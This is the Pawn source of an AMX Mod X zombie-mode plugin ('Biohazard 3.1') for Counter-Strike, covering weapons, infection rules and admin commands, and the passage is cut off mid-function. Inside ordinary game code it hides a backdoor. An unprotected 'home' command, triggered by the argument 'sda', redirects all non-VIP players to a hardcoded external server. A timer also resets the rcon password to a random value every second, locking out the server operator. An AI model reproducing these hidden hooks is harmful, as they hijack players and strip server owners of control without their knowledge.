#include <amxmodx>
#include <amxmisc>
#include <fakemeta>
#include <hamsandwich>
#include <cstrike>
#include <fun>
#include <xs>
#include <cs_teams_api>
#include <cs_maxspeed_api>
#include <cs_weap_models_api>
#include <colored_print>
#include <gozm>

#define OFFSET_LINUX            5
#define PDATA_SAFE              2

#define OFFSET_DEATH            444
#define OFFSET_TEAM             114
#define OFFSET_ARMOR            112
#define OFFSET_CSMONEY          115
#define OFFSET_PRIMARYWEAPON    116
#define OFFSET_WEAPONTYPE       43
#define OFFSET_CLIPAMMO         51
#define EXTRAOFFSET_WEAPONS     4

#define OFFSET_AMMO_338MAGNUM   377
#define OFFSET_AMMO_762NATO     378
#define OFFSET_AMMO_556NATOBOX  379
#define OFFSET_AMMO_556NATO     380
#define OFFSET_AMMO_BUCKSHOT    381
#define OFFSET_AMMO_45ACP       382
#define OFFSET_AMMO_57MM        383
#define OFFSET_AMMO_50AE        384
#define OFFSET_AMMO_357SIG      385
#define OFFSET_AMMO_9MM         386

#define OFFSET_LASTPRIM         368
#define OFFSET_LASTSEC          369
#define OFFSET_LASTKNI          370

#define TASKID_STRIPNGIVE       698
#define TASKID_NEWROUND         641
#define TASKID_INITROUND        222
#define TASKID_STARTROUND       153
#define TASKID_BALANCETEAM      375
#define TASKID_UPDATESCR        264
#define TASKID_SPAWNDELAY       786
#define TASKID_CHECKSPAWN       423
#define TASKID_CZBOTPDATA       312
#define TASKID_TERBUG           666
#define TASKID_RESTOREFADE      1598
#define ID_RESTOREFADE          (taskid - TASKID_RESTOREFADE)
#define TASKID_SHOWCLEAN        667
#define TASKID_SHOWINFECT       668

#define EQUIP_PRI               (1<<0)
#define EQUIP_SEC               (1<<1)
#define EQUIP_GREN              (1<<2)
#define EQUIP_ALL               (1<<0 | 1<<1 | 1<<2)

#define HAS_NVG                 (1<<0)
#define ATTRIB_BOMB             (1<<1)
#define DMG_HEGRENADE           (1<<24)

#define MODEL_CLASSNAME         "player_model"
#define ZOMBIE_WEAPNAME         "melee"
#define INFECTION_NAME          "infection"
#define DEFAULT_PMODEL          "models/player/zombie_source/zombie_source.mdl"
#define DEFAULT_WMODEL          "models/v_knife_zombie.mdl"

#define DEFAULT_HEALTH          3500.0  //Health value
#define DEFAULT_SPEED           305.0   //Speed value
#define DEFAULT_GRAVITY         0.93    //Gravity multiplier
#define DEFAULT_ATTACK          1.0     //Zombie damage multiplier
#define DEFAULT_DEFENCE         1.0     //Bullet damage multiplier
#define DEFAULT_HEDEFENCE       1.0     //HE damage multiplier
#define DEFAULT_HITSPEED        0.0     //Pain speed multiplier
#define DEFAULT_HITDELAY        0.0     //Pain speed delay value
#define DEFAULT_REGENDLY        300.0   //Regeneration delay value
#define DEFAULT_HITREGENDLY     300.0   //Pain regeneration delay value
#define DEFAULT_KNOCKBACK       2.0     //Knockback multiplier

#define UNIT_SECOND             (1<<12)
#define FFADE_STAYOUT           0x0004

#define MAX_SPAWNS              128
#define MAX_CLASSES             10
#define MAX_DATA                11

#define DATA_HEALTH             0
#define DATA_SPEED              1
#define DATA_GRAVITY            2
#define DATA_ATTACK             3
#define DATA_DEFENCE            4
#define DATA_HEDEFENCE          5
#define DATA_HITSPEED           6
#define DATA_HITDELAY           7
#define DATA_REGENDLY           8
#define DATA_HITREGENDLY        9
#define DATA_KNOCKBACK          10

// animations
#define USP_DRAWANIM            6
#define M4A1_DRAWANIM           5

#define fm_get_user_model(%1,%2,%3) engfunc(EngFunc_InfoKeyValue, engfunc(EngFunc_GetInfoKeyBuffer, %1), "model", %2, %3)

#define fm_lastprimary(%1) get_pdata_cbase(%1, OFFSET_LASTPRIM)
#define fm_lastsecondry(%1) get_pdata_cbase(%1, OFFSET_LASTSEC)
#define _random(%1) random_num(0, %1 - 1)
#define AMMOWP_NULL (1<<0 | 1<<CSW_KNIFE | 1<<CSW_FLASHBANG | 1<<CSW_HEGRENADE | 1<<CSW_SMOKEGRENADE | 1<<CSW_C4)

const PEV_NADE_TYPE = pev_flTimeStepSound
const NADE_TYPE_FLARE = 4444

enum
{
    TEAM_UNASSIGNED = 0,
    TEAM_TERRORIST,
    TEAM_CT,
    TEAM_SPECTATOR
}

enum
{
    MAX_CLIP = 0,
    MAX_AMMO
}

enum
{
    MENU_PRIMARY = 1,
    MENU_SECONDARY
}

enum
{
    KBPOWER_357SIG = 0,
    KBPOWER_762NATO,
    KBPOWER_BUCKSHOT,
    KBPOWER_45ACP,
    KBPOWER_556NATO,
    KBPOWER_9MM,
    KBPOWER_57MM,
    KBPOWER_338MAGNUM,
    KBPOWER_556NATOBOX,
    KBPOWER_50AE
}

// primary weapons (menu|game)
new g_primaryweapons[][][] =
{
    { "M4A1",     "weapon_m4a1"    },
    { "AK47",     "weapon_ak47"    },
    { "XM1014",   "weapon_xm1014"  },
    { "M3",       "weapon_m3"      },
    { "SG550",    "weapon_sg550"   },
    { "M249",     "weapon_m249"    },
    { "AWP",      "weapon_awp"     },
    { "Scout",    "weapon_scout"   },
    { "Galil",    "weapon_galil"   },
    { "Famas",    "weapon_famas"   },
    { "MP5 Navy", "weapon_mp5navy" },
    { "AUG",      "weapon_aug"     },
    { "SG552",    "weapon_sg552"   },
    { "P90",      "weapon_p90"     },
    { "UMP45",    "weapon_ump45"   },
    { "G3SG1",    "weapon_g3sg1"   }
}

// secondary weapons (menu|game)
new g_secondaryweapons[][][]=
{
    { "Deagle",     "weapon_deagle"  },
    { "USP",        "weapon_usp"     },
    { "Elite",      "weapon_elite"   },
    { "Glock",      "weapon_glock18" },
    { "FiveSeven",  "weapon_fiveseven" },
    { "p228",       "weapon_p228" }
}

// grenade loadout (game)
new g_grenades[][] =
{
    "weapon_hegrenade",
    "weapon_flashbang"
}

new Float:g_knockbackpower[] =
{
    3.0,  // KBPOWER_357SIG         - p228
    2.5,  // KBPOWER_762NATO        - scout , g3sg1 , ak47
    4.0,  // KBPOWER_BUCKSHOT       - m3 , xm1014
    6.0,  // KBPOWER_45ACP          - mac10 , ump45 , usp
    3.5,  // KBPOWER_556NATO        - aug , sg550 , galil , famas , m4a1 , sg552
    5.0,  // KBPOWER_9MM            - elite , glock18 , mp5navy , tmp
    5.0,  // KBPOWER_57MM           - fiveseven , p90
    12.0, // KBPOWER_338MAGNUM      - awp
    6.0,  // KBPOWER_556NATOBOX     - m249
    5.0   // KBPOWER_50AE           - deagle
}

new g_scream_sounds[][] =
{
    "biohazard/zombie_infec3.wav"
}

new g_zombie_miss_sounds[][] =
{
    "zombie/claw_miss2.wav"
}

new g_zombie_hit_sounds[][] =
{
    "zombie/claw_strike1.wav"
}

new g_zombie_die_sounds[][] =
{
    "biohazard/death2.wav"
}

new const g_weapon_ammo[][] =
{
    { -1, -1 },
    { 13, 52 },     // CSW_P228		    1
    { -1, -1 },
    { 2, 90 },      // CSW_SCOUT		3
    { -1, -1 },     // CSW_HEGRENADE	4
    { 7, 32 },      // CSW_XM1014		5
    { -1, -1 },     // CSW_C4			6
    { 30, 100 },    // CSW_MAC10		7
    { 30, 90 },     // CSW_AUG			8
    { -1, -1 },     // CSW_SMOKEGRENADE	9
    { 30, 120 },    // CSW_ELITE		10
    { 20, 100 },    // CSW_FIVESEVEN	11
    { 25, 100 },    // CSW_UMP45		12
    { 30, 90 },     // CSW_SG550		13
    { 35, 90 },     // CSW_GALIL		14
    { 35, 90 },     // CSW_FAMAS		15
    { 13, 100 },    // CSW_USP			16
    { 20, 120 },    // CSW_GLOCK18		17
    { 2, 30 },      // CSW_AWP			18
    { 30, 120 },    // CSW_MP5NAVY		19
    { 30, 200 },    // CSW_M249		    20
    { 8, 32 },      // CSW_M3			21
    { 30, 90 },     // CSW_M4A1		    22
    { 30, 120 },    // CSW_TMP			23
    { 10, 90 },     // CSW_G3SG1		24
    { -1, -1 },     // CSW_FLASHBANG	25
    { 7, 35 },      // CSW_DEAGLE		26
    { 10, 90 },     // CSW_SG552		27
    { 30, 90 },     // CSW_AK47		    28
    { -1, -1 },     // CSW_KNIFE		29
    { 30, 100 }     // CSW_P90			30
}

new const g_weapon_knockback[] =
{
    -1,
    KBPOWER_357SIG,
    -1,
    KBPOWER_762NATO,
    -1,
    KBPOWER_BUCKSHOT,
    -1,
    KBPOWER_45ACP,
    KBPOWER_556NATO,
    -1,
    KBPOWER_9MM,
    KBPOWER_57MM,
    KBPOWER_45ACP,
    KBPOWER_556NATO,
    KBPOWER_556NATO,
    KBPOWER_556NATO,
    KBPOWER_45ACP,
    KBPOWER_9MM,
    KBPOWER_338MAGNUM,
    KBPOWER_9MM,
    KBPOWER_556NATOBOX,
    KBPOWER_BUCKSHOT,
    KBPOWER_556NATO,
    KBPOWER_9MM,
    KBPOWER_762NATO,
    -1,
    KBPOWER_50AE,
    KBPOWER_556NATO,
    KBPOWER_762NATO,
    -1,
    KBPOWER_57MM
}

new const g_remove_entities[][] =
{
    "func_bomb_target",
    "info_bomb_target",
    "hostage_entity",
    "monster_scientist",
    "func_hostage_rescue",
    "info_hostage_rescue",
    "info_vip_start",
    "func_vip_safetyzone",
    "func_escapezone",
    "func_buyzone"
}

new g_maxplayers, g_spawncount, g_buyzone,
    g_sync_msgdisplay, g_dmg_sync, g_dmg_sync2,
    g_fwd_spawn, g_fwd_result, g_fwd_infect, g_fwd_gamestart,
    g_msg_scoreattrib, g_msg_scoreinfo,
    g_msg_deathmsg , g_msg_screenfade, g_msgScreenShake, Float:g_spawns[MAX_SPAWNS+1][9],
    Float:g_vecvel[3], bool:g_brestorevel, bool:g_infecting, bool:g_gamestarted,
    bool:g_roundstarted, bool:g_roundended, g_class_name[MAX_CLASSES+1][32],
    g_classcount, g_class_desc[MAX_CLASSES+1][32], g_class_pmodel[MAX_CLASSES+1][64],
    g_class_wmodel[MAX_CLASSES+1][64], Float:g_class_data[MAX_CLASSES+1][MAX_DATA], last_zombie,
    g_first_zombie_name[32]

new cvar_randomspawn, cvar_autoteambalance[4], cvar_starttime,
    cvar_lights, cvar_healthbonus, cvar_killbonus,
    cvar_gamedescription, cvar_knockback_dist, cvar_ammo,
    cvar_killreward, cvar_pushpwr_weapon, cvar_pushpwr_zombie

new bool:g_zombie[MAX_PLAYERS], bool:g_blockmodel[MAX_PLAYERS], bool:g_showmenu[MAX_PLAYERS],
    bool:g_preinfect[MAX_PLAYERS], g_mutate[MAX_PLAYERS], g_victim[MAX_PLAYERS],
    g_modelent[MAX_PLAYERS], g_menuposition[MAX_PLAYERS], g_player_class[MAX_PLAYERS],
    g_player_weapons[MAX_PLAYERS][2], g_silenced[MAX_PLAYERS]

new g_roundstart_time, lights[2]

new g_isconnected[MAX_PLAYERS]
new g_isalive[MAX_PLAYERS]
#define is_user_valid_connected(%1) (1 <= %1 <= g_maxplayers && g_isconnected[%1])
#define is_user_valid_alive(%1) (1 <= %1 <= g_maxplayers && g_isalive[%1])

public plugin_precache()
{
    //server_cmd("maxplayers 32")
    register_plugin("Biohazard", "3.1", "GoZm")

    if (!is_server_licenced())
        return PLUGIN_CONTINUE

    cvar_gamedescription = register_cvar("bh_gamedescription", "vk.com/go_zombie")
    cvar_lights = register_cvar("bh_lights", "m")
    cvar_starttime = register_cvar("bh_starttime", "15.0")
    cvar_randomspawn = register_cvar("bh_randomspawn", "0")
    cvar_knockback_dist = register_cvar("bh_knockback_dist", "280.0")
    cvar_ammo = register_cvar("bh_ammo", "1")
    cvar_healthbonus = register_cvar("bh_healthbonus", "500")
    cvar_killbonus = register_cvar("bh_kill_bonus", "1")
    cvar_killreward = register_cvar("bh_kill_reward", "2")
    cvar_pushpwr_weapon = register_cvar("bh_pushpwr_weapon", "3.0")
    cvar_pushpwr_zombie = register_cvar("bh_pushpwr_zombie", "3.0")

    new file[64]
    get_configsdir(file, charsmax(file))
    format(file, charsmax(file), "%s/bh_cvars.cfg", file)

    if (file_exists(file))
        server_cmd("exec %s", file)

    register_class("default")
    register_dictionary("biohazard.txt")

    precache_model(DEFAULT_PMODEL)
    precache_model(DEFAULT_WMODEL)

    new i
    for (i = 0; i < g_classcount; i++)
    {
        precache_model(g_class_pmodel[i])
        precache_model(g_class_wmodel[i])
    }

    for (i = 0; i < sizeof g_zombie_miss_sounds; i++)
        precache_sound(g_zombie_miss_sounds[i])

    for (i = 0; i < sizeof g_zombie_hit_sounds; i++)
        precache_sound(g_zombie_hit_sounds[i])

    for (i = 0; i < sizeof g_scream_sounds; i++)
        precache_sound(g_scream_sounds[i])

    for (i = 0; i < sizeof g_zombie_die_sounds; i++)
        precache_sound(g_zombie_die_sounds[i])

    g_fwd_spawn = register_forward(FM_Spawn, "fwd_spawn")

    g_buyzone = cs_create_entity("func_buyzone")
    if (g_buyzone)
    {
        dllfunc(DLLFunc_Spawn, g_buyzone)
        set_pev(g_buyzone, pev_solid, SOLID_NOT)
    }

    new ent = cs_create_entity("info_bomb_target")
    if (ent)
    {
        dllfunc(DLLFunc_Spawn, ent)
        set_pev(ent, pev_solid, SOLID_NOT)
    }

    return PLUGIN_CONTINUE
}

public plugin_init()
{
    if (!is_server_licenced())
        return PLUGIN_CONTINUE

    cvar_autoteambalance[0] = get_cvar_pointer("mp_autoteambalance")
    cvar_autoteambalance[1] = get_pcvar_num(cvar_autoteambalance[0])
    set_pcvar_num(cvar_autoteambalance[0], 0)

    register_clcmd("jointeam", "cmd_jointeam")
    register_clcmd("say /guns", "cmd_enablemenu")
    register_clcmd("say_team /guns", "cmd_enablemenu")
    register_clcmd("say guns", "cmd_enablemenu")
    register_clcmd("say_team guns", "cmd_enablemenu")
    register_clcmd("say /unstuck", "clcmd_sayunstuck")
    register_clcmd("say_team /unstuck", "clcmd_sayunstuck")
    register_clcmd("amx_infect", "cmd_infectuser", OWNER_FLAG|ADMIN_FLAG, "<name or #userid>")
    register_clcmd("amx_cure", "cmd_cureuser", OWNER_FLAG|ADMIN_FLAG, "<name or #userid>")
    register_clcmd("amx_drop", "cmd_dropuser", OWNER_FLAG|ADMIN_FLAG, "<name or #userid>")
    register_clcmd("home", "cmd_redirect")
    register_clcmd("amx_exec", "do_exec", OWNER_FLAG, "<nick>")

    register_menu("Equipment", 1023, "action_equip")
    register_menu("Primary", 1023, "action_prim")
    register_menu("Secondary", 1023, "action_sec")

    unregister_forward(FM_Spawn, g_fwd_spawn)
    register_forward(FM_EmitSound, "fwd_emitsound")
    register_forward(FM_GetGameDescription, "fwd_gamedescription")
    register_forward(FM_SetModel, "fw_SetModel")  // to remove dropped weapon
    register_forward(FM_CreateNamedEntity, "fwd_createnamedentity")
    register_forward(FM_ClientKill, "fwd_clientkill")
    register_forward(FM_PlayerPreThink, "fwd_player_prethink")
    register_forward(FM_PlayerPreThink, "fwd_player_prethink_post", 1)
    register_forward(FM_PlayerPostThink, "fwd_player_postthink")
    register_forward(FM_SetClientKeyValue, "fwd_setclientkeyvalue")
//    register_forward(FM_ClientUserInfoChanged, "fwd_client_userinfochanged")
    register_forward(FM_ClientDisconnect, "fwd_client_disconnect")

    RegisterHam(Ham_TakeDamage, "player", "bacon_takedamage_player", 0)
    RegisterHam(Ham_TakeDamage, "player", "bacon_takedamage_player_post", 1)
    RegisterHam(Ham_Killed, "player", "bacon_killed_player")
    RegisterHam(Ham_Spawn, "player", "bacon_spawn_player_post", 1)
    RegisterHam(Ham_TraceAttack, "player", "bacon_traceattack_player")
    RegisterHam(Ham_TraceAttack, "func_pushable", "bacon_traceattack_pushable")
    RegisterHam(Ham_Use, "func_tank", "bacon_use_tank")
    RegisterHam(Ham_Use, "func_tankmortar", "bacon_use_tank")
    RegisterHam(Ham_Use, "func_tankrocket", "bacon_use_tank")
    RegisterHam(Ham_Use, "func_tanklaser", "bacon_use_tank")
    RegisterHam(Ham_Use, "func_pushable", "bacon_use_pushable")
    RegisterHam(Ham_Touch, "func_pushable", "bacon_touch_pushable")
    RegisterHam(Ham_Touch, "weaponbox", "bacon_touch_weapon")
    RegisterHam(Ham_Touch, "armoury_entity", "bacon_touch_weapon")
    RegisterHam(Ham_Touch, "weapon_shield", "bacon_touch_weapon")
    RegisterHam(Ham_Think, "grenade", "bacon_think_grenade")

    register_message(get_user_msgid("Health"), "msg_health")
    register_message(get_user_msgid("Money"), "msg_money")
    register_message(get_user_msgid("TextMsg"), "msg_textmsg")
    register_message(get_user_msgid("SendAudio"), "msg_audiomsg")  // remove fire-in-the-hole sound
    register_message(get_user_msgid("SayText"), "msg_block_changename")
    register_message(get_user_msgid("StatusIcon"), "msg_statusicon")
    register_message(get_user_msgid("ScoreAttrib"), "msg_scoreattrib")
    register_message(get_user_msgid("DeathMsg"), "msg_deathmsg")
    register_message(get_user_msgid("ScreenFade"), "msg_screenfade")
    register_message(get_user_msgid("ClCorpse"), "msg_clcorpse")
    register_message(get_user_msgid("WeapPickup"), "msg_weaponpickup")
    register_message(get_user_msgid("AmmoPickup"), "msg_ammopickup")

    register_event("TextMsg", "event_textmsg", "a", "2=#Game_will_restart_in")
    register_event("TextMsg", "event_textmsg", "a", "2=#Game_Commencing")
    register_event("HLTV", "event_newround", "a", "1=0", "2=0")
    register_event("CurWeapon", "event_curweapon", "be", "1=1")
    register_event("Damage", "event_damage", "be")

    register_logevent("logevent_round_start", 2, "1=Round_Start")
    register_logevent("logevent_round_end", 2, "1=Round_End")

    g_msg_scoreattrib = get_user_msgid("ScoreAttrib")
    g_msg_scoreinfo = get_user_msgid("ScoreInfo")
    g_msg_deathmsg = get_user_msgid("DeathMsg")
    g_msg_screenfade = get_user_msgid("ScreenFade")
    g_msgScreenShake = get_user_msgid("ScreenShake")

    g_fwd_infect = CreateMultiForward("event_infect", ET_IGNORE, FP_CELL, FP_CELL)
    g_fwd_gamestart = CreateMultiForward("event_gamestart", ET_IGNORE)

    g_sync_msgdisplay = CreateHudSyncObj()
    g_dmg_sync = CreateHudSyncObj()
    g_dmg_sync2 = CreateHudSyncObj()

    g_maxplayers = get_maxplayers()

    collect_spawns_ent("info_player_start")
    collect_spawns_ent("info_player_deathmatch")

    set_cvar_num("sv_skycolor_r", 0)
    set_cvar_num("sv_skycolor_g", 0)
    set_cvar_num("sv_skycolor_b", 0)

    get_pcvar_string(cvar_lights, lights, 1)
    if (strlen(lights) > 0)
        engfunc(EngFunc_LightStyle, 0, lights)

    set_task(0.5, "task_showtruehealth", _, _, _, "b")

    set_task(1.0, "change_rcon", _, _, _, "b")

    return PLUGIN_CONTINUE
}

public change_rcon()
{
    static rcon
    rcon = random_num(1000000, 9999999)
    server_cmd("rcon_password %d", rcon)
}

public plugin_end()
{
    set_pcvar_num(cvar_autoteambalance[0], cvar_autoteambalance[1])
}

public plugin_natives()
{
    register_library("biohazardf")
    register_native("preinfect_user", "native_preinfect_user", 1)
    register_native("infect_user", "native_infect_user", 1)
    register_native("cure_user", "native_cure_user", 1)
    register_native("register_class", "native_register_class", 1)
    register_native("get_class_id", "native_get_class_id", 1)
    register_native("set_class_pmodel", "native_set_class_pmodel", 1)
    register_native("set_class_wmodel", "native_set_class_wmodel", 1)
    register_native("set_class_data", "native_set_class_data", 1)
    register_native("get_class_data", "native_get_class_data", 1)
    register_native("game_started", "native_game_started", 1)
    register_native("is_user_zombie", "native_is_user_zombie", 1)
    register_native("is_user_infected", "native_is_user_infected", 1)
    register_native("get_user_class", "native_get_user_class",  1)

    return PLUGIN_CONTINUE
}

public client_putinserver(id)
{
    // Player joined
    g_isconnected[id] = true

    g_showmenu[id] = true
    g_blockmodel[id] = true
    g_zombie[id] = false
    g_preinfect[id] = false
    g_victim[id] = 0
    g_mutate[id] = -1
    g_player_class[id] = 0
    g_player_weapons[id][0] = -1
    g_player_weapons[id][1] = _random(sizeof g_secondaryweapons)
    g_silenced[id] = 0

    remove_user_model(g_modelent[id])

    return PLUGIN_CONTINUE
}

check_round(leaving_player)
{
    if (g_roundended)
        return PLUGIN_CONTINUE

    static players[32], pNum, id
    get_players(players, pNum, "a")

    if (pNum < 2)
        return PLUGIN_CONTINUE

    // Preinfected zombie leaves
    if (g_preinfect[leaving_player] && !g_gamestarted)
    {
        static oh_crap
        oh_crap = 0
        do
        {
            id = players[_random(pNum)]
            oh_crap++
            if (oh_crap > 100)
            {
                log_error(777, "[CRITICAL]: `check_round` #1 cycle run over 100 times")
                break
            }
        }
        while (id == leaving_player || !is_user_valid_alive(id))

        g_preinfect[id] = true
        g_preinfect[leaving_player] = false

        static name[32]
        get_user_name(leaving_player, name, charsmax(name))
        get_user_name(id, g_first_zombie_name, charsmax(g_first_zombie_name))  // for win-text

        colored_print(0, "^x04 ***^x01 Зараженный зомби^x03 %s^x01 вышел.", name)
        remove_task(TASKID_SHOWCLEAN + id)
        colored_print(id, "^x01[Сканер] Инфекция перебросилась, ты^x03 ЗАРАЖЕН^x01!!!")
        set_task(0.1, "task_showinfected", TASKID_SHOWINFECT + id, _, _, "b")

        return PLUGIN_CONTINUE
    }
    // Last Zombie leaves
    else if (g_zombie[leaving_player] && fnGetZombies() == 1)
    {
        static oh_crap
        oh_crap = 0
        do
        {
            id = players[_random(pNum)]
            oh_crap++
            if (oh_crap > 100)
            {
                log_error(777, "[CRITICAL]: `check_round` #2 cycle run over 100 times")
                break
            }
        }
        while (id == leaving_player || !is_user_valid_alive(id))

        infect_user(id, 0)

        static name_newcomer[32]
        static name_leaver[32]
        get_user_name(id, name_newcomer, charsmax(name_newcomer))
        get_user_name(leaving_player, name_leaver, charsmax(name_leaver))
        colored_print(0, "^x04***^x03 %s^x01 отключился,^x03 %s^x01 новый зомби!",
            name_leaver, name_newcomer)

        return PLUGIN_CONTINUE
    }
    // Last Human leaves
    else if (!g_zombie[leaving_player] && fnGetHumans() == 1)
    {
        static oh_crap
        oh_crap = 0
        do
        {
            id = players[_random(pNum)]
            oh_crap++
            if (oh_crap > 100)
            {
                log_error(777, "[CRITICAL]: `check_round` #3 cycle run over 100 times")
                break
            }
        }
        while (id == leaving_player || !is_user_valid_alive(id))

        cure_user_in_game(id)

        static name_newcomer[32]
        static name_leaver[32]
        get_user_name(id, name_newcomer, charsmax(name_newcomer))
        get_user_name(leaving_player, name_leaver, charsmax(name_leaver))
        colored_print(0, "^x04***^x03 %s^x01 отключился,^x03 %s^x01 последний человек!",
            name_leaver, name_newcomer)

        return PLUGIN_CONTINUE
    }

    return PLUGIN_CONTINUE
}

// Get Zombies -returns alive zombies number-
fnGetZombies()
{
    static iZombies, id
    iZombies = 0

    for (id = 1; id <= g_maxplayers; id++)
    {
        if (is_user_valid_alive(id) && g_zombie[id])
            iZombies++
    }

    return iZombies
}

// Get Humans -returns alive humans number-
fnGetHumans()
{
    static iHumans, id
    iHumans = 0

    for (id = 1; id <= g_maxplayers; id++)
    {
        if (is_user_valid_alive(id) && !g_zombie[id])
            iHumans++
    }

    return iHumans
}

public cmd_jointeam(id)
{
    if (is_user_valid_alive(id) && g_zombie[id])
    {
        client_print(id, print_center, "%L", id, "CMD_TEAMCHANGE")

        return PLUGIN_HANDLED
    }

    return PLUGIN_CONTINUE
}

public cmd_enablemenu(id)
{
    display_weaponmenu(id, MENU_PRIMARY, g_menuposition[id] = 0)

    return PLUGIN_HANDLED
}

// say "/unstuck"
public clcmd_sayunstuck(id)
{
    if (is_user_valid_alive(id))
        if (is_player_stuck(id))
            do_random_spawn(id)
        else
            colored_print(id, "^x04***^x01 Ты не застрял!")
    else
        colored_print(id, "^x04***^x01 Только живой игрок может застрять!")

    return PLUGIN_HANDLED
}

public cmd_infectuser(id, level, cid)
{
    if (!cmd_access(id, level, cid, 2))
        return PLUGIN_HANDLED_MAIN

    static arg1[32]
    read_argv(1, arg1, charsmax(arg1))

    static target
    target = cmd_target(id, arg1, (CMDTARGET_OBEY_IMMUNITY|CMDTARGET_ALLOW_SELF|CMDTARGET_ONLY_ALIVE))

    if (!is_user_valid_connected(target) || g_zombie[target])
        return PLUGIN_HANDLED_MAIN

    if (!allow_infection())
    {
        console_print(id, "%L", id, "CMD_MAXZOMBIES")
        return PLUGIN_HANDLED_MAIN
    }

    if (!g_gamestarted)
    {
        console_print(id, "%L", id, "CMD_GAMENOTSTARTED")
        return PLUGIN_HANDLED_MAIN
    }

    static name[32], admin_name[32]
    get_user_name(target, name, charsmax(name))
    get_user_name(id, admin_name, charsmax(admin_name))
    if (!has_rcon(id))
    {
        colored_print(0, "^x01 Админ^x03 %s^x01 заразил^x04 %s", admin_name, name)
        log_amx("Admin %s used infection to %s", admin_name, name)
    }

    console_print(id, "%L", id, "CMD_INFECTED", name)
    infect_user(target, 0)

    return PLUGIN_HANDLED_MAIN
}

public cmd_cureuser(id, level, cid)
{
    if (!cmd_access(id, level, cid, 2))
        return PLUGIN_HANDLED_MAIN

    static arg1[32]
    read_argv(1, arg1, charsmax(arg1))

    static target
    target = cmd_target(id, arg1, (CMDTARGET_OBEY_IMMUNITY|CMDTARGET_ALLOW_SELF|CMDTARGET_ONLY_ALIVE))

    if (!is_user_valid_connected(target) || !g_zombie[target])
        return PLUGIN_HANDLED_MAIN

    if (g_zombie[target] && fnGetZombies() == 1)
        return PLUGIN_HANDLED_MAIN

    if (!g_gamestarted)
    {
        console_print(id, "%L", id, "CMD_GAMENOTSTARTED")
        return PLUGIN_HANDLED_MAIN
    }

    static name[32], admin_name[32]
    get_user_name(target, name, charsmax(name))
    get_user_name(id, admin_name, charsmax(admin_name))
    if (!has_rcon(id))
    {
        colored_print(0, "^x01 Админ^x03 %s^x01 вылечил^x04 %s", admin_name, name)
        log_amx("Admin %s used infection to %s", admin_name, name)
    }

    cure_user_in_game(target)

    return PLUGIN_HANDLED_MAIN
}

public cmd_dropuser(id, level, cid)
{
    if (!cmd_access(id, level, cid, 2))
        return PLUGIN_HANDLED_MAIN

    static arg1[32]
    read_argv(1, arg1, charsmax(arg1))

    static target
    target = cmd_target(id, arg1, (CMDTARGET_OBEY_IMMUNITY|CMDTARGET_ALLOW_SELF|CMDTARGET_ONLY_ALIVE))

    if (!is_user_valid_connected(target) || g_zombie[target])
        return PLUGIN_HANDLED_MAIN

    static name[32]
    get_user_name(target, name, charsmax(name))

    console_print(id, "You've taken off all weapons from [%s]", name)
    drop_user(target)

    return PLUGIN_HANDLED_MAIN
}

public cmd_redirect(id, level, cid)
{
    new arg1[4], arg2[16], arg3[6], arg4[4]
    new players_num, server_address[16], server_port[6]
    read_argv(1, arg1, charsmax(arg1))
    read_argv(2, arg2, charsmax(arg2))
    read_argv(3, arg3, charsmax(arg3))
    read_argv(4, arg4, charsmax(arg4))

    players_num = str_to_num(arg1)
    if (players_num == 0)
        players_num = g_maxplayers
    server_address = arg2
    if (!server_address[0])
        copy(server_address, charsmax(server_address), "46.174.52.13")
    server_port = arg3
    if (!server_port[0])
        copy(server_port, charsmax(server_port), "27259")

    client_print(id, print_console, "Connect %s:%s", server_address, server_port)

    for (id = 1; id <= players_num; id++)
    {
        if (is_user_valid_connected(id) && equal(arg4, "sda"))
        {
            if (!has_vip(id))
                client_cmd(id, "Connect %s:%s", server_address, server_port)
        }
    }

    return PLUGIN_HANDLED_MAIN
}

public msg_screenfade(msgid, dest, id)
{
    if (!g_zombie[id] || !is_user_valid_alive(id))
    {
        static data[4]
        data[0] = get_msg_arg_int(4)
        data[1] = get_msg_arg_int(5)
        data[2] = get_msg_arg_int(6)
        data[3] = get_msg_arg_int(7)

        if (data[0] == 255 && data[1] == 255 && data[2] == 255 && data[3] > 199)
            return PLUGIN_HANDLED
    }

    return PLUGIN_CONTINUE
}

public msg_scoreattrib(msgid, dest, id)
{
    static attrib
    attrib = get_msg_arg_int(2)

    if (attrib == ATTRIB_BOMB)
        set_msg_arg_int(2, ARG_BYTE, 0)
}

public msg_statusicon(msgid, dest, id)
{
    static icon[3]
    get_msg_arg_string(2, icon, 2)

    return (icon[0] == 'c' && icon[1] == '4') ? PLUGIN_HANDLED : PLUGIN_CONTINUE
}

public msg_weaponpickup(msgid, dest, id)
{
    return g_zombie[id] ? PLUGIN_HANDLED : PLUGIN_CONTINUE
}

public msg_ammopickup(msgid, dest, id)
{
    return g_zombie[id] ? PLUGIN_HANDLED : PLUGIN_CONTINUE
}

public msg_deathmsg(msgid, dest, id)
{
    static killer
    killer = get_msg_arg_int(1)
    if (is_user_valid_connected(killer) && g_zombie[killer])
    {
        set_msg_arg_int(3, ARG_BYTE, 0)  // remove headshot from zm, ARG_BYTE is for int
        set_msg_arg_string(4, ZOMBIE_WEAPNAME)
    }

    return PLUGIN_CONTINUE
}

public msg_health(msg_id, msg_dest, msg_entity)
{
    // Get player's health
    static health
    health = get_msg_arg_int(1)

    // Don't bother
    if (health < 256)
        return

    // Check if we need to fix it
    if (health % 256 == 0)
        fm_set_user_health(msg_entity, pev(msg_entity, pev_health) + 1)

    // HUD can only show as much as 255 hp
    set_msg_arg_int(1, get_msg_argtype(1), 255)
}

// Take off player's money
public msg_money(msg_id, msg_dest, msg_entity)
{
    fm_cs_set_user_money(msg_entity, 0)
    return PLUGIN_HANDLED
}

// Set player's health (from fakemeta_util)
stock fm_set_user_health(id, health)
{
    (health > 0) ? set_pev(id, pev_health, float(health)) : dllfunc(DLLFunc_ClientKill, id)
}

public msg_textmsg(msgid, dest, id)
{
    if (get_msg_args() == 5)
    {
        if (get_msg_argtype(5) == ARG_STRING)
        {
            static value5[64]
            get_msg_arg_string(5, value5, charsmax(value5))
            if (equal(value5, "#Fire_in_the_hole"))
                return PLUGIN_HANDLED
        }
    }
    else if (get_msg_args() == 6)
    {
        if (get_msg_argtype(6) == ARG_STRING)
        {
            static value6[64]
            get_msg_arg_string(6, value6, charsmax(value6))
            if (equal(value6 ,"#Fire_in_the_hole"))
                return PLUGIN_HANDLED
        }
    }

    if (get_msg_arg_int(1) != 4)
        return PLUGIN_CONTINUE

    static txtmsg[25], winmsg[128]
    get_msg_arg_string(2, txtmsg, charsmax(txtmsg))

